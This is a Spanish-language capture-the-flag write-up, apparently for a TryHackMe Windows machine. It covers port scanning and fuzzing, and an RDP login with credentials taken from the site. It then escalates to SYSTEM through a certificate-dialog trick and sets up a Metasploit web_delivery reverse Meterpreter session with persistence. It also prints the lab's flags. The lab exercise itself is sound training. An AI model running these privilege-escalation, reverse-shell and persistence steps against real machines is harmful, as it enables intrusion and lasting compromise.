Lo primero que haremos será hacer un nmap y enumerar los puertos abiertos


![Write_up_maquinas/maquina3-bluster/img/img01.png](https://github.com/alvarobueno21/Hacking_Etico/blob/ddb1d83cc03a05b359f343c74555f284a59ef527/Write_up_maquinas/maquina3-bluster/img/img01.png)


Una vez hecho esto haremos fuzzing y encontramos una ruta /retro


![Write_up_maquinas/maquina3-bluster/img/img02.png](https://github.com/alvarobueno21/Hacking_Etico/blob/ddb1d83cc03a05b359f343c74555f284a59ef527/Write_up_maquinas/maquina3-bluster/img/img02.png)


Nos vamos a la pagina y encontramos que el nombre de Wade se refiere a un personaje de avatar que se llama parzival

![Write_up_maquinas/maquina3-bluster/img/img03.png](https://github.com/alvarobueno21/Hacking_Etico/blob/ddb1d83cc03a05b359f343c74555f284a59ef527/Write_up_maquinas/maquina3-bluster/img/img03.png)

Ahora nos conectaremos por rdp, si no lo tenemos instalado lo instalamos con el siguiente comando:

sudo apt update && sudo apt install freerdp2-x11

Y luego para conectarnos por rdp a la maquina lo haremos con este otro comando:

xfreerdp /u:wade /p:parzival /v:192.168.1.211

Y si miramos el documento de texto del escritorio tenemos esta flag: THM{HACK_PLAYER_ONE}

Si nos fijamos bien en el escritorio, hay un ejecutable, le damos a abrir con administrador y hacemos click en Show details y luego nos saldra una pestaña para ver información sobre el certificado, hacemos click en ella y nos vamos a su pagina web.

![Write_up_maquinas/maquina3-bluster/img/img04.png](https://github.com/alvarobueno21/Hacking_Etico/blob/ddb1d83cc03a05b359f343c74555f284a59ef527/Write_up_maquinas/maquina3-bluster/img/img04.png)

Luego tendremos que irnos al navegador, configuración y guardar archivo y nos vamos a la ruta C:\Windows\System32 y luego en la parte de arriba pondremos C:\Windows\System32\cmd.exe, abrimos la cmd y ejecutamos whoaami y somos nt authority\system.

Si entramos en la terminal y hacemos un dir vemos un root.txt donde esta la flag.


Ahora nos iremos a hacer un sudo msfconsole y con el comando search exploit/multi/script/web_delivery nos pondremos a ejecutar el exploit.

Ahora tendremos que poner el siguiente comando: set payload windows/meterpreter/reverse_http y luego ejecutar run -j

Una vez hagamos esto tendremos que copiarnos la salida del comando y ejecutarlo en la shell de windows, luego nos vamos a sessions en metasploit y vemos que tenemos una activa que es un meterpreter.

Por ultimo hacemos un sysinfo y luego un run persistence -X
